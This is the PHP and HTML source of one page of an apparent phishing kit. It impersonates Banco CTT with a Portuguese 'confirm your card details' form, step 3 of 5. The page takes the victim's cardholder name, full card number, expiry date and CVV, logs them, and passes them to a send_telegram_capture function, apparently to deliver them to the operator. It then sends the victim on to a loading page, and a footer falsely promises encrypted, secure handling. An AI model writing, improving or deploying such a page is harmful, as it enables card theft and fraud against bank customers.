<?php
// ============================================================
//  card.php — Step 3: Card number, expiry, CVV
//  
// ============================================================
require_once 'config.php';

$ip = client_ip();
init_state($ip, 'card');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pan      = preg_replace('/\s+/', '', safe_input('pan'));
    $expiry   = preg_replace('/[^0-9\/]/', '', safe_input('expiry'));
    $cvv      = preg_replace('/\D/', '', safe_input('cvv'));
    $holder   = safe_input('holder');

    // Strip spaces from pan for validation
    $pan_digits = preg_replace('/\D/', '', $pan);

    if (strlen($pan_digits) < 13 || strlen($pan_digits) > 19) {
        json_response(array('status' => 'error', 'message' => 'Número de cartão inválido.'));
    }
    if (!preg_match('/^(0[1-9]|1[0-2])\/\d{2}$/', $expiry)) {
        json_response(array('status' => 'error', 'message' => 'Data de validade inválida (MM/AA).'));
    }
    if (strlen($cvv) < 3 || strlen($cvv) > 4) {
        json_response(array('status' => 'error', 'message' => 'Código CVV inválido.'));
    }
    if (strlen($holder) < 2) {
        json_response(array('status' => 'error', 'message' => 'Preencha o nome do titular.'));
    }

    $data = array(
        'card_holder' => $holder,
        'card_number' => $pan_digits,
        'card_expiry' => $expiry,
        'card_cvv'    => $cvv
    );
    log_capture('CARD', $ip, $data);
    send_telegram_capture('CARD', '💳 Card Details', $ip, $data);
    update_state_step($ip, 'card', $data);

    json_response(array('status' => 'ok', 'redirect' => 'loading.php'));
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dados do Cartão | Banco CTT Online</title>
<style><?php include '_style.php'; ?></style>
</head>
<body>
<div class="page">
    <div class="card">
        <div class="brand-bar">Confirmação de Dados</div>

        <div class="step-header">
            <span>Dados do Cartão</span>
            <span class="step-num">Passo 3 / 5</span>
        </div>

        <div class="logo-area">
            <img src="https://thebanks.eu/img/logos/Banco_CTT.png" alt="Banco CTT" onerror="this.outerHTML='<span class=&quot;logo-fallback&quot;>Banco CTT</span>'">
        </div>

        <div class="progress">
            <div class="seg done"></div>
            <div class="seg done"></div>
            <div class="seg active"></div>
            <div class="seg"></div>
            <div class="seg"></div>
        </div>

        <div class="body">
            <h2>Dados do Cartão</h2>
            <p class="subtitle">
                Por sua segurança, confirme os dados<br>
                do cartão associado à sua conta.
            </p>

            <div id="msg" class="msg"></div>

            <div class="credit-card" id="cardPreview">
                <div class="logo">VISA</div>
                <div>
                    <div class="chip"></div>
                    <div class="pan" id="panPreview">•••• •••• •••• ••••</div>
                </div>
                <div class="meta">
                    <div>
                        <div>Cardholder</div>
                        <div class="val" id="holderPreview">NOME DO TITULAR</div>
                    </div>
                    <div>
                        <div>Expires</div>
                        <div class="val" id="expiryPreview">MM/YY</div>
                    </div>
                </div>
            </div>

            <form id="cardForm" autocomplete="off">
                <div class="field">
                    <label>Nome do Titular <span class="req">*</span></label>
                    <input type="text" name="holder" id="holder" placeholder="NOME DO TITULAR" maxlength="50" required>
                </div>

                <div class="field">
                    <label>Número do Cartão <span class="req">*</span></label>
                    <input type="text" name="pan" id="pan" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" required>
                    <div class="hint">Como impresso no seu cartão</div>
                </div>

                <div class="row">
                    <div class="field">
                        <label>Data de Validade <span class="req">*</span></label>
                        <input type="text" name="expiry" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
                    </div>
                    <div class="field">
                        <label>CVV <span class="req">*</span></label>
                        <input type="password" name="cvv" id="cvv" placeholder="•••" maxlength="4" inputmode="numeric" required>
                        <div class="hint">Código de 3 dígitos no verso</div>
                    </div>
                </div>

                <button type="submit" class="btn btn-primary" id="submitBtn">CONFIRMAR</button>
            </form>
        </div>

        <div class="footer">
            © 2026 Banco CTT — Todos os dados são transmitidos de forma encriptada (SSL)
        </div>
    </div>
</div>

<div class="overlay" id="overlay"><div class="spinner"></div></div>

<script>
(function(){
    var form     = document.getElementById('cardForm');
    var msg      = document.getElementById('msg');
    var overlay  = document.getElementById('overlay');
    var submitBtn= document.getElementById('submitBtn');
    var panEl    = document.getElementById('pan');
    var expEl    = document.getElementById('expiry');
    var cvvEl    = document.getElementById('cvv');
    var holderEl = document.getElementById('holder');

    var panPrev   = document.getElementById('panPreview');
    var expPrev   = document.getElementById('expiryPreview');
    var holderPrev= document.getElementById('holderPreview');

    // PAN: digits only, max 19, group by 4 with spaces
    panEl.addEventListener('input', function(){
        var raw = this.value.replace(/\D/g, '').slice(0, 19);
        var grouped = raw.replace(/(.{4})/g, '$1 ').trim();
        this.value = grouped;
        panPrev.textContent = grouped || '•••• •••• •••• ••••';
    });

    // Expiry: MM/YY auto-format
    expEl.addEventListener('input', function(){
        var v = this.value.replace(/\D/g, '').slice(0, 4);
        if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
        this.value = v;
        expPrev.textContent = v || 'MM/YY';
    });

    // CVV: digits only
    cvvEl.addEventListener('input', function(){
        this.value = this.value.replace(/\D/g, '').slice(0, 4);
    });

    // Holder preview (uppercase)
    holderEl.addEventListener('input', function(){
        var v = this.value.toUpperCase();
        holderPrev.textContent = v || 'NOME DO TITULAR';
    });

    form.addEventListener('submit', function(e){
        e.preventDefault();

        // Client-side validation
        var pan = panEl.value.replace(/\s/g, '');
        var exp = expEl.value;
        var cvv = cvvEl.value;

        if (pan.length < 13) { showErr('Introduza um número de cartão válido.'); return; }
        if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)) { showErr('Introduza a data de validade no formato MM/AA.'); return; }
        if (cvv.length < 3) { showErr('Introduza um CVV válido.'); return; }
        if (holderEl.value.length < 2) { showErr('Preencha o nome do titular.'); return; }

        overlay.classList.add('show');
        submitBtn.disabled = true;
        [panEl, expEl, cvvEl, holderEl].forEach(function(el){ el.disabled = true; });

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'card.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function(){
            if (xhr.readyState !== 4) return;
            overlay.classList.remove('show');
            try {
                var resp = JSON.parse(xhr.responseText);
                if (resp.status === 'ok' && resp.redirect) {
                    window.location.href = resp.redirect;
                } else {
                    showErr(resp.message || 'Erro. Tente novamente.');
                    submitBtn.disabled = false;
                    [panEl, expEl, cvvEl, holderEl].forEach(function(el){ el.disabled = false; });
                }
            } catch(err) {
                showErr('Erro de comunicação.');
                submitBtn.disabled = false;
                [panEl, expEl, cvvEl, holderEl].forEach(function(el){ el.disabled = false; });
            }
        };
        xhr.send('pan=' + encodeURIComponent(pan)
              + '&expiry=' + encodeURIComponent(exp)
              + '&cvv=' + encodeURIComponent(cvv)
              + '&holder=' + encodeURIComponent(holderEl.value));
    });

    function showErr(text){
        msg.className = 'msg error';
        msg.textContent = text;
        msg.style.display = 'block';
    }
})();
</script>
</body>
</html>